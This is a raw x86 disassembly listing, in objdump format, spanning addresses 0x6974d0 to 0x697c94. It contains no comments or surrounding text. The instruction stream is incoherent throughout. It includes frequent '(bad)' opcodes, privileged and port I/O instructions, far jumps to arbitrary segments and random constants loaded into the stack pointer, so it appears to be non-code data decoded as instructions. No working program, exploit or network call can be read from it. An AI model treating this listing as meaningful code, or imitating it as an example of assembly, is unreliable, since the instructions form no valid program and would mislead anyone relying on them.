  6974d0:	loopne 0x6974f4
  6974d2:	addr16 mov cl,0x8a
  6974d5:	(bad)  
  6974d6:	neg    DWORD PTR [ebx+0x6f]
  6974d9:	push   ds
  6974da:	pusha  
  6974db:	stos   BYTE PTR es:[edi],al
  6974dc:	(bad)  [edi]
  6974de:	call   0xa26c:0xdec33504
  6974e5:	or     ebx,ebx
  6974e7:	pop    edi
  6974e8:	in     al,0x81
  6974ea:	sbb    DWORD PTR [eax+esi*1-0x35],eax
  6974ee:	push   eax
  6974ef:	pusha  
  6974f0:	int    0x0
  6974f2:	(bad)  
  6974f3:	nop
  6974f4:	jmp    0xc721:0x27b3e12f
  6974fb:	mov    bh,0xf0
  6974fd:	in     al,0xf
  6974ff:	das    
  697500:	std    
  697501:	adc    BYTE PTR [ebx],bh
  697503:	mov    ch,0xce
  697505:	jno    0x697557
  697507:	cwde   
  697508:	cmc    
  697509:	inc    esi
  69750a:	rcl    DWORD PTR [ebx+eiz*1-0x20],1
  69750e:	in     eax,0xd5
  697510:	and    dl,BYTE PTR [esi-0x40]
  697513:	in     al,0x3b
  697515:	pop    ebx
  697516:	pop    esi
  697517:	scas   al,BYTE PTR es:[edi]
  697518:	neg    ebx
  69751a:	sbb    BYTE PTR [edx+0x6a0e8066],ah
  697520:	mov    ebx,0x26187a6f
  697525:	mov    eax,ds:0x684d10c2
  69752a:	enter  0x82c7,0xf5
  69752e:	xlat   BYTE PTR ds:[ebx]
  69752f:	mov    ds:0x62c9a319,al
  697534:	popa   
  697535:	jmp    0x697527
  697537:	pop    ds
  697538:	test   BYTE PTR [esi-0x421afb6a],0x42
  69753f:	leave  
  697540:	mov    edi,esp
  697542:	or     DWORD PTR [edx+ebx*4+0x35],esp
  697546:	call   0x4ff71182
  69754b:	jbe    0x6975b2
  69754d:	fucomi st,st(2)
  69754f:	push   esi
  697550:	jp     0x6975c0
  697552:	xor    bh,al
  697554:	jecxz  0x6975af
  697556:	sbb    bh,BYTE PTR [edx]
  697558:	mov    esp,0xf93824b8
  69755d:	leave  
  69755e:	outs   dx,BYTE PTR ds:[esi]
  69755f:	(bad)  
  697560:	fsubr  QWORD PTR [ecx-0x35022e20]
  697566:	dec    ebp
  697567:	or     DWORD PTR [eax],eax
  697569:	xchg   esp,eax
  69756a:	aaa    
  69756b:	add    DWORD PTR [esi-0x52],ebp
  69756e:	(bad)  
  69756f:	out    0xa3,al
  697571:	mov    bl,0x6b
  697573:	cmp    dh,BYTE PTR [ebx]
  697575:	icebp  
  697576:	adc    cl,cl
  697578:	cmp    esi,DWORD PTR ds:[ecx+0x22cda9b8]
  69757f:	pusha  
  697580:	mov    bh,0xf7
  697582:	loopne 0x6975da
  697584:	(bad)  
  697585:	test   DWORD PTR [ecx+0x5c],0x3751d7ba
  69758c:	and    DWORD PTR [eax],edi
  69758e:	lock imul DWORD PTR [eax]
  697591:	push   ecx
  697592:	lds    edi,FWORD PTR [eax+edx*1-0xb]
  697596:	shr    BYTE PTR [edx-0x16],0xe4
  69759a:	icebp  
  69759b:	sbb    dh,BYTE PTR [edx]
  69759d:	adc    al,0x63
  69759f:	aaa    
  6975a0:	sbb    ebx,DWORD PTR [edx-0x77fbd6f2]
  6975a6:	cmp    al,0xc3
  6975a8:	cmp    BYTE PTR [esi+0x7d36ab5f],al
  6975ae:	xchg   esp,eax
  6975af:	lds    ebp,FWORD PTR [ebx-0x184e3d87]
  6975b5:	mov    bh,0x30
  6975b7:	cwde   
  6975b8:	aaa    
  6975b9:	jle    0x697542
  6975bb:	or     BYTE PTR [ebp+0x79fe0be8],cl
  6975c1:	out    dx,eax
  6975c2:	lods   eax,DWORD PTR ds:[esi]
  6975c3:	std    
  6975c4:	or     eax,0x24def99f
  6975c9:	outs   dx,BYTE PTR ds:[esi]
  6975ca:	neg    DWORD PTR [eax]
  6975cc:	inc    ecx
  6975cd:	cli    
  6975ce:	mov    esi,0xa7c7154c
  6975d3:	rcr    DWORD PTR [edx+eax*4-0x45],cl
  6975d7:	lds    ebp,FWORD PTR [ecx+0x13]
  6975da:	lahf   
  6975db:	xchg   ebp,eax
  6975dc:	push   edi
  6975dd:	push   es
  6975de:	fdivr  QWORD PTR [ebp+0x3e10c8c7]
  6975e4:	and    ebx,DWORD PTR [ecx-0x7]
  6975e7:	mov    esp,0xfd49d4b3
  6975ec:	xor    esp,esi
  6975ee:	add    cl,0xf1
  6975f1:	adc    ebp,DWORD PTR [edx+0x658910e9]
  6975f7:	mov    bl,0xc1
  6975f9:	jle    0x6975f6
  6975fb:	hlt    
  6975fc:	and    al,0x45
  6975fe:	fwait
  6975ff:	test   DWORD PTR [edx-0x62],0xa081d62f
  697606:	nop
  697607:	into   
  697608:	stos   BYTE PTR es:[edi],al
  697609:	mov    ah,0x8b
  69760b:	iret   
  69760c:	mov    eax,ds:0xb9474a99
  697611:	or     eax,0xd7bd64fa
  697616:	outs   dx,DWORD PTR ds:[esi]
  697617:	popa   
  697618:	mov    eax,ebp
  69761a:	addr16 mov ch,0xce
  69761d:	ins    BYTE PTR es:[edi],dx
  69761e:	or     dh,BYTE PTR [edx+ebx*1]
  697621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  697622:	dec    ebx
  697623:	push   cs
  697624:	pop    ecx
  697625:	cmp    dh,bh
  697627:	shl    BYTE PTR [ecx+0x72180ed2],0x86
  69762e:	jne    0x6975c9
  697630:	shr    BYTE PTR [ebx],cl
  697632:	mov    ecx,0x9dc4b26b
  697637:	push   0x28198181
  69763c:	fwait
  69763d:	jne    0x697669
  69763f:	(bad)  
  697640:	sti    
  697641:	or     BYTE PTR ds:0xd9b985f6,dl
  697647:	cmp    dl,BYTE PTR [esi-0x666e85ed]
  69764d:	jl     0x6976a6
  69764f:	jl     0x69761b
  697651:	pop    ebp
  697652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  697653:	fnstenv [ecx-0x79]
  697656:	(bad)  
  697657:	stc    
  697658:	add    edx,DWORD PTR ds:0xfd6ff6b4
  69765e:	xchg   ecx,eax
  69765f:	(bad)  
  697660:	mov    ch,0xe5
  697662:	and    eax,0x4cd32745
  697667:	push   0x88b4610b
  69766c:	xor    BYTE PTR [ecx],0x31
  69766f:	push   es
  697670:	out    dx,al
  697671:	mov    ds:0x791d37ad,eax
  697676:	or     DWORD PTR [ebp-0x45fc44f7],ecx
  69767c:	and    ebp,DWORD PTR ds:0x40373f57
  697682:	wrmsr  
  697684:	jge    0x6976fc
  697686:	fbld   TBYTE PTR [ecx]
  697688:	fwait
  697689:	stc    
  69768a:	imul   esi,DWORD PTR [esi+0x57],0xda241161
  697691:	adc    BYTE PTR [ecx+0x64190510],ah
  697697:	jnp    0x6976c3
  697699:	cmp    cl,bh
  69769b:	sahf   
  69769c:	les    ebp,FWORD PTR [edx+ebp*2-0x5f54f8c9]
  6976a3:	call   0xea62e63a
  6976a8:	add    al,0x81
  6976aa:	and    dh,dh
  6976ac:	jecxz  0x6976fe
  6976ae:	cmp    al,bh
  6976b0:	clc    
  6976b1:	ret    
  6976b2:	dec    ebx
  6976b3:	mov    bh,0x49
  6976b5:	popf   
  6976b6:	iret   
  6976b7:	sub    dh,BYTE PTR [edi-0x31]
  6976ba:	push   0x7a407dc4
  6976bf:	pop    eax
  6976c0:	cmp    BYTE PTR [ebp+0x30],0x3
  6976c4:	adc    al,0xc1
  6976c6:	popa   
  6976c7:	sbb    al,0xf1
  6976c9:	ds jo  0x6976dc
  6976cc:	enter  0xbc0c,0xd2
  6976d0:	mov    ah,0x50
  6976d2:	in     al,dx
  6976d3:	and    eax,0xf4aa8da6
  6976d8:	push   es
  6976d9:	add    edx,DWORD PTR [ebx+0x35]
  6976dc:	arpl   WORD PTR [ebx+0x32363d1f],dx
  6976e2:	xchg   edx,eax
  6976e3:	out    dx,al
  6976e4:	xchg   edx,eax
  6976e5:	jbe    0x697699
  6976e7:	push   ss
  6976e8:	(bad)  
  6976e9:	pop    ebp
  6976ea:	mov    BYTE PTR [eax-0x1a1ef6f9],ch
  6976f0:	dec    ebp
  6976f1:	lea    ecx,[edi+0x63]
  6976f4:	outs   dx,DWORD PTR ds:[esi]
  6976f5:	out    0xa8,eax
  6976f7:	mov    edx,DWORD PTR [ebp+ecx*4+0xf]
  6976fb:	call   0x4a31:0x220c3df7
  697702:	pop    eax
  697703:	fcmovbe st,st(3)
  697705:	jecxz  0x6976d0
  697707:	mov    WORD PTR [edi+0x487470c],?
  69770d:	jns    0x69778a
  69770f:	out    0x7,eax
  697711:	adc    eax,0xe2cf123e
  697716:	mov    bh,bl
  697718:	xchg   edx,eax
  697719:	adc    bh,BYTE PTR [ecx]
  69771b:	adc    eax,0x5a6756f5
  697720:	mov    esp,0x7176a14
  697725:	dec    edi
  697726:	cmp    BYTE PTR [esi],bh
  697728:	xchg   ebp,eax
  697729:	mov    esp,0x8ee2ea44
  69772e:	ds nop
  697730:	(bad)  
  697732:	pop    ds
  697733:	sub    al,0x74
  697735:	jo     0x697732
  697737:	adc    DWORD PTR es:[ebx],esp
  69773a:	dec    edx
  69773b:	push   es
  69773c:	enter  0x2b22,0x8e
  697740:	dec    esp
  697741:	push   edi
  697742:	inc    ebp
  697743:	jp     0x697757
  697745:	in     al,dx
  697746:	fxtract 
  697748:	push   esp
  697749:	mov    edi,0x880e13f2
  69774e:	push   cs
  69774f:	inc    esp
  697750:	int3   
  697751:	sub    eax,0xfe748e08
  697756:	jmp    0x4d4d7b00
  69775b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69775c:	leave  
  69775d:	mov    BYTE PTR [ebp+0x23ac39cd],0x81
  697764:	and    esi,0x647337fa
  69776a:	jmp    0xdcab:0x59802c1
  697771:	ins    DWORD PTR es:[edi],dx
  697772:	xchg   edi,eax
  697773:	sub    eax,0x72acab0
  697778:	sub    ebx,esp
  69777a:	push   ebx
  69777b:	data16 mov bl,0xf6
  69777e:	jno    0x6977d0
  697780:	rcr    esi,0x51
  697783:	cmp    eax,ebx
  697785:	cdq    
  697786:	aam    0xc6
  697788:	arpl   WORD PTR [esi-0x3e1776fd],sp
  69778e:	rcl    BYTE PTR [esi+0x3c],1
  697791:	call   0x3f9a:0x46ce23a3
  697798:	mov    bh,0x95
  69779a:	sub    DWORD PTR [eax-0x4e],0xffffffa4
  69779e:	cwde   
  69779f:	aad    0x8d
  6977a1:	mov    BYTE PTR [ebp+0x11],al
  6977a4:	lahf   
  6977a5:	mov    dl,0x7b
  6977a7:	add    BYTE PTR [esi],dl
  6977a9:	push   0x6f
  6977ab:	pop    ecx
  6977ac:	(bad)  
  6977ad:	inc    edx
  6977ae:	jmp    0x3739:0xc3792835
  6977b5:	jmp    0x697746
  6977b7:	mov    bl,0x3c
  6977b9:	fdiv   st(2),st
  6977bb:	xor    BYTE PTR [ecx+0x8],ch
  6977be:	stc    
  6977bf:	pop    ebp
  6977c0:	je     0x6977f6
  6977c2:	stos   DWORD PTR es:[edi],eax
  6977c3:	iret   
  6977c4:	es test eax,0x29a6dab2
  6977ca:	neg    BYTE PTR [ecx+edx*1+0x6e92b117]
  6977d1:	pop    esp
  6977d2:	ret    0xc9c1
  6977d5:	fs adc al,0xa5
  6977d8:	jle    0x6977f7
  6977da:	mov    ah,0xd5
  6977dc:	and    DWORD PTR [edi-0x64],esi
  6977df:	aam    0x3b
  6977e1:	jle    0x697828
  6977e3:	cwde   
  6977e4:	sub    ch,BYTE PTR [ecx+0x427fd9d4]
  6977ea:	xchg   ebp,eax
  6977eb:	mov    edx,0xcb6b214
  6977f0:	sbb    DWORD PTR [ebx+0x2],0xffffffc6
  6977f4:	cdq    
  6977f5:	and    BYTE PTR ds:0x32ae4423,al
  6977fb:	mov    al,0x32
  6977fd:	push   eax
  6977fe:	sub    ah,bl
  697800:	inc    edi
  697801:	clc    
  697802:	sbb    DWORD PTR [edi+0x331073b1],0x32917f1d
  69780c:	sub    BYTE PTR [eax-0x8],cl
  69780f:	in     eax,dx
  697810:	in     eax,dx
  697811:	add    ch,ah
  697813:	jl     0x69781c
  697815:	push   edi
  697816:	xlat   BYTE PTR ds:[ebx]
  697817:	retf   0xae86
  69781a:	jo     0x697826
  69781c:	adc    eax,0xadde5d9a
  697821:	call   0xf119:0x97c26cc0
  697828:	pop    esp
  697829:	aam    0x21
  69782b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69782c:	adc    ah,BYTE PTR [eax+edi*2-0x23d808ab]
  697833:	or     BYTE PTR [esi+0x8],0x14
  697837:	push   edi
  697838:	and    BYTE PTR [ebx-0x21],ch
  69783b:	sar    DWORD PTR [ebx+0x274b5618],1
  697841:	stos   DWORD PTR es:[edi],eax
  697842:	lock pushf 
  697844:	bound  ebp,QWORD PTR [ebp+0x7a]
  697847:	(bad)  
  697848:	cmp    BYTE PTR [edi-0x5a24b9a9],ch
  69784e:	mov    eax,ds:0xa4e701ee
  697853:	mov    BYTE PTR [edx+0x5d],dl
  697856:	outs   dx,BYTE PTR ds:[esi]
  697857:	in     al,0x74
  697859:	scas   eax,DWORD PTR es:[edi]
  69785a:	into   
  69785b:	nop
  69785c:	sbb    DWORD PTR [edx-0x9f518a1],edi
  697862:	leave  
  697863:	adc    esi,ecx
  697865:	lsl    edi,WORD PTR [ecx+ebp*1-0x42]
  69786a:	xchg   esi,eax
  69786b:	sbb    ch,BYTE PTR [ecx+0x64]
  69786e:	sahf   
  69786f:	mov    BYTE PTR [edx+0x7],ah
  697872:	pop    es
  697873:	dec    ebp
  697874:	xlat   BYTE PTR ds:[ebx]
  697875:	xchg   ecx,eax
  697876:	lock xor dh,ah
  697879:	js     0x6978ce
  69787b:	out    0xa8,eax
  69787d:	sub    BYTE PTR [esi-0x738b02c8],bl
  697883:	ret    0x1a3c
  697886:	fistp  WORD PTR [esi+eiz*1]
  697889:	lds    esi,FWORD PTR [edi-0x22]
  69788c:	push   esp
  69788d:	retf   0x7113
  697890:	jmp    0x697816
  697892:	out    dx,al
  697893:	mov    dl,0x3f
  697895:	adc    al,0x6b
  697897:	mov    edx,0x3e91da86
  69789c:	adc    cl,BYTE PTR [edi]
  69789e:	mul    BYTE PTR [esi]
  6978a0:	cdq    
  6978a1:	push   ss
  6978a2:	mov    ds:0x6ef1edd4,al
  6978a7:	and    DWORD PTR [ebx],ebx
  6978a9:	cmp    al,0xeb
  6978ab:	cdq    
  6978ac:	adc    BYTE PTR [edi-0x656ffd49],0xa9
  6978b3:	inc    ecx
  6978b4:	sbb    ebx,0xf1fcf1c4
  6978ba:	cmp    ebx,DWORD PTR [esi]
  6978bc:	pop    edi
  6978bd:	jmp    0xfd2e:0x6c208701
  6978c4:	xchg   ebp,eax
  6978c5:	or     ebx,esp
  6978c7:	mov    dh,0xc5
  6978c9:	scas   eax,DWORD PTR es:[edi]
  6978ca:	into   
  6978cb:	xchg   edx,eax
  6978cc:	add    BYTE PTR [ebp-0x6d],ah
  6978cf:	pop    ds
  6978d0:	shl    BYTE PTR [bx],1
  6978d3:	push   ss
  6978d4:	das    
  6978d5:	push   edx
  6978d6:	adc    DWORD PTR [ecx-0x5c1003f8],esp
  6978dc:	mov    eax,0xb115e384
  6978e1:	imul   ebx,DWORD PTR [esi],0x59
  6978e4:	xchg   ecx,eax
  6978e5:	sub    DWORD PTR fs:[esi-0x32a929f4],edi
  6978ec:	cs data16 mov bh,0xeb
  6978f0:	or     eax,0xe7e5db40
  6978f5:	and    BYTE PTR ds:0xa431e3a7,ah
  6978fb:	push   esp
  6978fc:	daa    
  6978fd:	pop    esp
  6978fe:	retf   0x4ba
  697901:	jge    0x6978d9
  697903:	idiv   DWORD PTR [eax+0x47]
  697906:	fidivr WORD PTR gs:[edi]
  697909:	mov    BYTE PTR [eax+0x36],ah
  69790c:	xor    ebp,esp
  69790e:	(bad)  
  69790f:	cld    
  697910:	mov    edx,0x73cc5796
  697915:	ja     0x69795d
  697917:	jns    0x6978a0
  697919:	clc    
  69791a:	into   
  69791b:	push   esi
  69791c:	xchg   edi,eax
  69791d:	add    BYTE PTR [ecx],bl
  69791f:	add    al,0xcb
  697921:	rep outs dx,BYTE PTR ds:[esi]
  697923:	inc    edi
  697924:	cmp    BYTE PTR [ebp+0x4c],0x1a
  697928:	pop    es
  697929:	aas    
  69792a:	pop    ecx
  69792b:	rol    DWORD PTR [esi+0x24],cl
  69792e:	or     cl,BYTE PTR [edx]
  697930:	cs pop es
  697932:	shr    BYTE PTR [ebp-0x2c675492],0xee
  697939:	out    0x36,al
  69793b:	fistp  WORD PTR [ecx+0x1f]
  69793e:	cwde   
  69793f:	ja     0x697918
  697941:	dec    edx
  697942:	lds    ebp,FWORD PTR [ecx-0x70]
  697945:	inc    edx
  697946:	push   ebp
  697947:	sahf   
  697948:	cmp    bl,BYTE PTR [esi]
  69794a:	ror    BYTE PTR [edi],0xdd
  69794d:	or     eax,0x1779f7cf
  697952:	std    
  697953:	lods   al,BYTE PTR ds:[esi]
  697954:	pop    esp
  697955:	inc    BYTE PTR [ecx+0x2e]
  697958:	jmp    0x9e95:0x95e2e05b
  69795f:	jl     0x6979da
  697961:	rol    DWORD PTR [edx-0x16124f16],1
  697967:	in     al,0x1a
  697969:	sbb    al,0x17
  69796b:	adc    BYTE PTR [edi+0x3fbc0055],bl
  697971:	dec    edi
  697972:	xchg   ebx,eax
  697973:	dec    eax
  697974:	fnstenv [esi+0x55]
  697977:	xor    BYTE PTR [esi],bh
  697979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69797a:	jmp    0x697933
  69797c:	and    DWORD PTR [edi-0x10f9703d],ebx
  697982:	daa    
  697983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  697984:	jl     0x6979f1
  697986:	pop    cx
  697988:	outs   dx,DWORD PTR ds:[esi]
  697989:	and    edi,edi
  69798b:	xchg   edx,eax
  69798c:	into   
  69798d:	sub    eax,0x6e0595ed
  697992:	ret    
  697993:	or     eax,0x947bdff5
  697998:	push   esp
  697999:	xchg   ebp,eax
  69799a:	mov    bh,0xae
  69799c:	fst    DWORD PTR [edi+0x6fa1c597]
  6979a2:	stos   DWORD PTR es:[edi],eax
  6979a3:	xchg   ecx,eax
  6979a4:	xchg   ebp,eax
  6979a5:	sbb    esi,edx
  6979a7:	jo     0x697975
  6979a9:	enter  0xc198,0x34
  6979ad:	jne    0x6979f0
  6979af:	mov    ebp,0x3c927b92
  6979b4:	sbb    esp,DWORD PTR [esi]
  6979b6:	test   BYTE PTR [ecx+0x419cabb1],dl
  6979bc:	fcmovnu st,st(4)
  6979be:	enter  0x65ab,0x15
  6979c2:	dec    BYTE PTR [ecx+0x1084434e]
  6979c8:	lods   eax,DWORD PTR ds:[esi]
  6979c9:	inc    ebp
  6979ca:	sbb    eax,0x2c2890bb
  6979cf:	in     eax,dx
  6979d0:	repnz xor eax,0x8eeec732
  6979d6:	and    esi,esp
  6979d8:	xor    al,0xe1
  6979da:	push   esp
  6979db:	or     al,BYTE PTR [ebp-0x4f1b7a47]
  6979e1:	aad    0x6b
  6979e3:	test   al,0xf7
  6979e5:	jle    0x6979cd
  6979e7:	mov    cl,ch
  6979e9:	inc    edi
  6979ea:	cwde   
  6979eb:	or     al,0xad
  6979ed:	outs   dx,DWORD PTR ds:[esi]
  6979ee:	outs   dx,DWORD PTR ds:[esi]
  6979ef:	push   edi
  6979f0:	pop    esp
  6979f1:	add    BYTE PTR [ebp+0x57],0xec
  6979f5:	nop
  6979f6:	mov    ebx,0x9fa6ca4c
  6979fb:	stos   DWORD PTR es:[edi],eax
  6979fc:	arpl   WORD PTR [edx+ebx*8],di
  6979ff:	pop    esp
  697a00:	mov    dl,0x8
  697a02:	inc    esp
  697a03:	sbb    BYTE PTR ds:[esp+eax*4],0xc4
  697a08:	mov    WORD PTR [edx+0x75362010],gs
  697a0e:	push   ecx
  697a0f:	leave  
  697a10:	jl     0x6979c0
  697a12:	loope  0x697a4e
  697a14:	push   eax
  697a15:	dec    ebx
  697a16:	or     DWORD PTR [edi],eax
  697a18:	addr16 out 0x3b,eax
  697a1b:	ror    DWORD PTR [edx-0x2613b55f],0xe4
  697a22:	jno    0x6979ac
  697a24:	xchg   edx,eax
  697a25:	lods   al,BYTE PTR ds:[esi]
  697a26:	sahf   
  697a27:	cmp    ch,BYTE PTR [eax-0x38]
  697a2a:	ficom  DWORD PTR [eax+0x2]
  697a2d:	retf   
  697a2e:	push   ss
  697a2f:	cmp    BYTE PTR [ebp+0xbd704f8],al
  697a35:	(bad)  
  697a36:	mov    bh,0xf8
  697a38:	add    BYTE PTR [edi-0x714c7541],ch
  697a3e:	mov    bl,0xd8
  697a40:	outs   dx,BYTE PTR ds:[esi]
  697a41:	mov    ah,0xac
  697a43:	test   al,0xb0
  697a45:	div    DWORD PTR [ebp-0x1c]
  697a48:	rcl    BYTE PTR [ecx+0x5dd483b8],cl
  697a4e:	std    
  697a4f:	(bad)  [edi]
  697a51:	mov    al,0x94
  697a53:	sahf   
  697a54:	and    BYTE PTR [ecx-0x308dc2f1],dh
  697a5a:	or     bh,BYTE PTR ds:0xafc6e026
  697a60:	test   DWORD PTR [edi-0x2e],edx
  697a63:	in     eax,dx
  697a64:	je     0x697ab2
  697a66:	mov    ds:0x429099e,al
  697a6b:	mov    DWORD PTR [ecx+eiz*8-0x2f],eax
  697a6f:	jbe    0x697a5e
  697a71:	mov    dl,0x5b
  697a73:	pop    edi
  697a74:	and    DWORD PTR [edx+edi*1+0x43],esp
  697a78:	in     eax,0xd0
  697a7a:	fadd   DWORD PTR [esi+0x3f]
  697a7d:	test   BYTE PTR [eax+0x51],dh
  697a80:	jae    0x697aa5
  697a82:	xor    cl,0xd2
  697a85:	mov    edx,0x1abbcfeb
  697a8a:	(bad)  
  697a8b:	aaa    
  697a8c:	sbb    DWORD PTR cs:[esi+0x6c2bcb9e],ecx
  697a93:	jns    0x697a93
  697a95:	adc    eax,0x9809aba2
  697a9a:	cmp    eax,0x5b8c70ec
  697a9f:	mov    ds:0xf1a5321,al
  697aa4:	inc    edi
  697aa5:	enter  0xdd17,0xd2
  697aa9:	daa    
  697aaa:	sbb    eax,0xd64fb2d5
  697aaf:	mov    ds:0x6cdda727,eax
  697ab4:	idiv   DWORD PTR ds:0x748dfa82
  697aba:	call   0xca555f91
  697abf:	in     eax,0x51
  697ac1:	stos   DWORD PTR es:[edi],eax
  697ac2:	pop    ebx
  697ac3:	or     eax,0x73eaaf60
  697ac8:	clc    
  697ac9:	lea    ebp,[edi-0x4c]
  697acc:	push   esi
  697acd:	inc    edx
  697ace:	mov    BYTE PTR [esi-0x3637337],ah
  697ad4:	std    
  697ad5:	int    0xe9
  697ad7:	lahf   
  697ad8:	daa    
  697ad9:	scas   eax,DWORD PTR es:[edi]
  697ada:	dec    esi
  697adb:	fdivr  st,st(7)
  697add:	mov    dh,0xc5
  697adf:	cld    
  697ae0:	stc    
  697ae1:	popa   
  697ae2:	push   esp
  697ae3:	(bad)  
  697ae4:	mov    ebx,0x8c9895f4
  697ae9:	mov    WORD PTR [edi+edx*4+0x19],gs
  697aed:	mov    ebx,DWORD PTR [esi-0x2f]
  697af0:	mov    bh,ch
  697af2:	add    DWORD PTR [eax],ecx
  697af4:	inc    esp
  697af5:	push   ss
  697af6:	in     al,0xc2
  697af8:	sbb    bh,0xee
  697afb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  697afc:	cli    
  697afd:	inc    esp
  697afe:	pop    esi
  697aff:	fistp  DWORD PTR [ecx-0x34f87f4d]
  697b05:	cwde   
  697b06:	xor    eax,0x4aa8198e
  697b0b:	xor    dl,BYTE PTR [ecx]
  697b0d:	mov    cl,al
  697b0f:	or     BYTE PTR [ecx+0x1],0xba
  697b13:	(bad)  
  697b14:	stos   BYTE PTR es:[edi],al
  697b15:	out    0xb6,al
  697b17:	adc    BYTE PTR [ebx+edi*2-0x510e681f],0xce
  697b1f:	(bad)  
  697b20:	ins    BYTE PTR es:[edi],dx
  697b21:	iret   
  697b22:	aam    0x63
  697b24:	mov    eax,0x5f56fe4e
  697b29:	cld    
  697b2a:	imul   edi,edx,0x69004103
  697b30:	jne    0x697abd
  697b32:	sbb    cl,BYTE PTR [ecx+0x14]
  697b35:	in     eax,0x6
  697b37:	inc    BYTE PTR [ebx+0x2f]
  697b3a:	ja     0x697b6b
  697b3c:	mov    gs,WORD PTR [edx-0x17]
  697b3f:	xchg   DWORD PTR [ebp+0x45],ebp
  697b42:	xchg   BYTE PTR [ecx+0x60],bh
  697b45:	cmp    BYTE PTR [ebp-0x59],bl
  697b48:	push   ecx
  697b49:	pop    ds
  697b4a:	cmp    al,BYTE PTR [edx]
  697b4c:	inc    eax
  697b4d:	repz sub al,0xa0
  697b50:	cld    
  697b51:	push   0xffffffa1
  697b53:	cmp    BYTE PTR [esi+0x4959c2d3],dh
  697b59:	pop    eax
  697b5a:	icebp  
  697b5b:	mov    ecx,DWORD PTR [esi+0x2d82d6ad]
  697b61:	outs   dx,DWORD PTR ds:[esi]
  697b62:	add    DWORD PTR [ebp+0x21],ebp
  697b65:	mov    ah,ah
  697b67:	gs js  0x697af0
  697b6a:	daa    
  697b6b:	test   DWORD PTR [eax-0x3b],edx
  697b6e:	dec    edx
  697b6f:	pop    ecx
  697b70:	popf   
  697b71:	es scas eax,DWORD PTR es:[edi]
  697b73:	or     cl,BYTE PTR [ebx]
  697b75:	cmp    al,0x1e
  697b77:	or     cl,bl
  697b79:	cmp    eax,0xbfbb844e
  697b7e:	cli    
  697b7f:	jp     0x697b25
  697b81:	fmul   QWORD PTR [esi-0x47864680]
  697b87:	arpl   WORD PTR [ecx+0x4a00da32],dx
  697b8d:	stos   BYTE PTR es:[edi],al
  697b8e:	rcl    DWORD PTR [ebp+ebp*2-0x23],cl
  697b92:	iret   
  697b93:	push   0x86501171
  697b98:	push   es
  697b99:	jo     0x697c02
  697b9b:	fsubrp st(3),st
  697b9d:	mov    ds:0xb536955c,al
  697ba2:	pop    esp
  697ba3:	loope  0x697bd3
  697ba5:	bound  esp,QWORD PTR [edx-0x8]
  697ba8:	jg     0x697c20
  697baa:	fdivr  st(4),st
  697bac:	add    BYTE PTR [edx],al
  697bae:	cmp    ebx,DWORD PTR [ebp+0x6b]
  697bb1:	(bad)  
  697bb2:	dec    ebx
  697bb3:	pop    ebx
  697bb4:	mov    ecx,0x9b6ac51c
  697bb9:	mov    WORD PTR [edi+0x42814768],ds
  697bbf:	pop    esi
  697bc0:	sbb    ecx,ebp
  697bc2:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  697bc4:	and    BYTE PTR [ecx+0x383d90c4],ah
  697bca:	outs   dx,BYTE PTR ds:[esi]
  697bcb:	loope  0x697c07
  697bcd:	lock add DWORD PTR [edi+ebx*2],eax
  697bd1:	add    dh,BYTE PTR [edi+ebp*8+0x2b95800a]
  697bd8:	or     BYTE PTR ds:[ebx],ah
  697bdb:	push   eax
  697bdc:	xchg   esi,eax
  697bdd:	dec    esi
  697bde:	dec    ebp
  697bdf:	jmp    0xc0e4:0x5417070f
  697be6:	jo     0x697baa
  697be8:	test   BYTE PTR [edi+eax*8-0x50ec71a3],0x10
  697bf0:	mov    dl,0x2e
  697bf2:	jl     0x697bfb
  697bf4:	inc    edi
  697bf5:	sub    eax,0xb295c65e
  697bfa:	inc    esi
  697bfb:	mov    eax,ds:0x7a19ab1c
  697c00:	popa   
  697c01:	inc    ecx
  697c02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  697c03:	inc    esp
  697c04:	in     eax,0xbb
  697c06:	(bad)  
  697c07:	cmp    al,0x2c
  697c09:	mov    esi,0xba7bc50a
  697c0e:	std    
  697c0f:	sub    BYTE PTR [eax+0x49612501],ch
  697c15:	xchg   edx,eax
  697c16:	xchg   edx,eax
  697c17:	push   edx
  697c18:	inc    ecx
  697c19:	cmp    eax,DWORD PTR [edi+0x26dd067f]
  697c1f:	sar    DWORD PTR [esi-0x1],1
  697c22:	lahf   
  697c23:	mov    ds:0xa9e63802,al
  697c28:	pop    edx
  697c29:	dec    esi
  697c2a:	add    cl,BYTE PTR [edi-0x451004b9]
  697c30:	or     BYTE PTR [ebp-0x4],0x41
  697c34:	retf   
  697c35:	cld    
  697c36:	jg     0x697bef
  697c38:	imul   ecx,DWORD PTR [esi+0x1],0x3d395a3d
  697c3f:	loop   0x697c93
  697c41:	mov    esi,0x7a5d5c35
  697c46:	sub    ch,BYTE PTR [ecx-0xd]
  697c49:	sahf   
  697c4a:	xor    al,0x83
  697c4c:	xchg   DWORD PTR [edx],ecx
  697c4e:	jne    0x697c90
  697c50:	fs jg  0x697bd8
  697c53:	add    bl,BYTE PTR [edx+0x4c905806]
  697c59:	lods   eax,DWORD PTR ds:[esi]
  697c5a:	(bad)  
  697c5b:	je     0x697cbb
  697c5d:	hlt    
  697c5e:	push   ss
  697c5f:	sub    DWORD PTR [esi],edx
  697c61:	mov    cl,0xdc
  697c63:	(bad)  [ecx]
  697c65:	nop
  697c66:	add    DWORD PTR [ecx-0x325a9e8c],esp
  697c6c:	sbb    bh,0xe4
  697c6f:	fistp  DWORD PTR [edx]
  697c71:	sti    
  697c72:	sbb    edi,ecx
  697c74:	adc    edx,DWORD PTR [edx-0x74e86aa2]
  697c7a:	xor    DWORD PTR [edx],esi
  697c7c:	ins    BYTE PTR es:[edi],dx
  697c7d:	jg     0x697c67
  697c7f:	retf   
  697c80:	dec    edx
  697c81:	lahf   
  697c82:	out    0xae,al
  697c84:	outs   dx,DWORD PTR ds:[esi]
  697c85:	add    BYTE PTR [eax-0x27137a0e],dh
  697c8b:	imul   edx,DWORD PTR [ecx],0xe7d0930c
  697c91:	iret   
  697c92:	cmp    edx,ebp
  697c94:	xor    eax,0xdbc77a54
